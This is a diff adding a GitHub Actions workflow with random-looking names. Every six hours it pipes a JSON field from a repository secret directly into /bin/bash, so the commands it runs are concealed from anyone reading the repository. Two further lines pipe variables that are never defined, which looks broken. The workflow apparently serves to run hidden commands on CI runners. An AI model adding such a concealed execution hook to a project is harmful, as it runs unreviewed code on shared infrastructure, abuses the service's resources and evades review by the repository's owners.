@@ -1,0 +1,20 @@
+name: yangjushi6451
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangjushi6451
+        env:
+          ytjy57557: ${{ secrets.ytjy57557 }}
+        run: |
+          echo $ytjy57557 | jq -r .lzw2 | /bin/bash
+          echo $ttb84888 | jq -r .pegoe12049 | /bin/bash
+          echo $lkac8501 | jq -r .qbi0949 | /bin/bash
+
